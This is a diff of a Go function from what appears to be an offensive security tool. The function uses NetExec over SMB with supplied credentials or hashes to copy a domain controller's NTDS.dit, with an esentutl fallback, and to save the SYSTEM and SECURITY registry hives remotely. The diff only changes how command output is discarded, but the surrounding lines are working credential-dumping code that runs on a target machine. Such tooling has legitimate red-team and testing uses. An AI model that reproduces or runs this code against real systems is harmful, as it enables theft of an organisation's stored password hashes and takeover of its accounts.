@@ -40,14 +40,14 @@ func (s *NativeShadowManager) ExtractNTDSNative(target, domain, user, pass, hash
 	copyCmd := fmt.Sprintf("cmd /c copy /b %s %s", ntdsPath, tmpNtds)
 	args = buildNXCArgs("smb", target, domain, user, pass, hash, copyCmd)
 	cmd = exec.Command("nxc", args...)
-	out, err = cmd.CombinedOutput()
+	_, err = cmd.CombinedOutput()
 	if err != nil {
 		// Fallback: try esentutl
 		fmt.Println("[*] Direct copy failed, trying esentutl...")
 		esentutlCmd := fmt.Sprintf("cmd /c esentutl /y %s /d %s /o", ntdsPath, tmpNtds)
 		args = buildNXCArgs("smb", target, domain, user, pass, hash, esentutlCmd)
 		cmd = exec.Command("nxc", args...)
-		out, err = cmd.CombinedOutput()
+		_, err = cmd.CombinedOutput()
 		if err != nil {
 			return fmt.Errorf("NTDS.dit copy failed: %w", err)
 		}
@@ -59,7 +59,7 @@ func (s *NativeShadowManager) ExtractNTDSNative(target, domain, user, pass, hash
 	sysHiveCmd := "cmd /c reg save HKLM\\SYSTEM C:\\Windows\\Temp\\tmp_system.hiv /y"
 	args = buildNXCArgs("smb", target, domain, user, pass, hash, sysHiveCmd)
 	cmd = exec.Command("nxc", args...)
-	out, err = cmd.CombinedOutput()
+	_, err = cmd.CombinedOutput()
 	if err != nil {
 		return fmt.Errorf("SYSTEM hive save failed: %w", err)
 	}
@@ -70,7 +70,7 @@ func (s *NativeShadowManager) ExtractNTDSNative(target, domain, user, pass, hash
 	secHiveCmd := "cmd /c reg save HKLM\\SECURITY C:\\Windows\\Temp\\tmp_security.hiv /y"
 	args = buildNXCArgs("smb", target, domain, user, pass, hash, secHiveCmd)
 	cmd = exec.Command("nxc", args...)
-	out, err = cmd.CombinedOutput()
+	_, err = cmd.CombinedOutput()
 	if err != nil {
 		fmt.Printf("[!] SECURITY hive save failed (non-fatal): %v\n", err)
 	}
